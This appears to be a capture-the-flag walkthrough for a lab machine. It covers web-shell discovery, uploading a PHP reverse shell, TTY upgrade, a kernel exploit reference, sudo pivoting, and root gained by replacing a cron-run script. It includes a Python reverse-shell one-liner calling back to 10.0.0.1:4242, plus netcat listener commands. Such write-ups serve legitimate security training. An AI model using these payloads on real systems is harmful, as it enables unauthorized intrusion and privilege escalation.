# Enumeration
- using `sudo nmap -p- -A -T4 -Pn 10.10.10.68 ` to enumerate we find:![](attachment/d4c273b4743c20bc28a0cd6c0c92a2ad.png)
- We find a webpage on the ip address:![](attachment/5a6d58c02089207fea9147f06539f6f7.png)
	The article mentions about https://github.com/Arrexel/phpbash
- The github page states that a bash cli is present on the website accessible by xyz/phpbash.php hence we use dirbuster and find that it exists:![](attachment/20a36d69c094d3fee4a348b60b4398b3.png)
- We navigate to the above mentioned directory and find a bash terminal with user privileges where we can collect our flag from user.txt
- Then we upload a reverse shell from https://github.com/pentestmonkey/php-reverse-shell and execute it by visiting the webpage http://10.10.10.68/uploads/reverse-php-shell.php while listening through netcat using `nc -nvlp 4444`![](attachment/abc3131b88d8618af0f219581a734d05.png)
- We notice that we do not have full tty so we execute the following to gain full tty:
	```
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
	```
- After we gain full tty we find the linux version and other details using:
	```
	(cat /proc/version || uname -a ) 2>/dev/null
	lsb_release -a 2>/dev/null # old, not by default on many systems
	cat /etc/os-release 2>/dev/null # universal on modern systems
	```

	After which we found out the linux machine runs Ubuntu 16.04.2 LTS![](attachment/3de844dd460cd69837437d3f398e3b68.png)
	For which we discovered an exploit https://www.exploit-db.com/exploits/44298 which we compiled to a php file for uploading using `gcc 44298.c -o hax.php` which we uploaded using the phpbash.
- Now we can rename it from php to unnamed `mv hax.php hax` and make it executable `chmod +x hax`
- We found out using `sudo -l` that scriptmanager can execute all commands without password![](attachment/0e2722a839e971e6a32b2cae877f807b.png)
- So we can access the user by doing  `sudo -u scriptmanager /bin/bash` ![](attachment/8f92d23dad29249f3c9dbbd4a74e14f6.png)
- Found an unusual scripts folder ![](attachment/003790b7e1f55d10c352c24b99e8017d.png)
- We find a text.py file in that which executes frequently and makes a  text.txt file which is owned by root: ![](attachment/cb2b56fd2a17350e04fafc68b547ed81.png)
- Using this cheatsheat https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl we make a test.py file with: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`
- then use wget to move it to the scripts directory and replace the test.py![](attachment/3716351bad134204328ef72d724d6f62.png)
- we get a root shell![](attachment/2241314b241ff4146d4bba91479d90ff.png)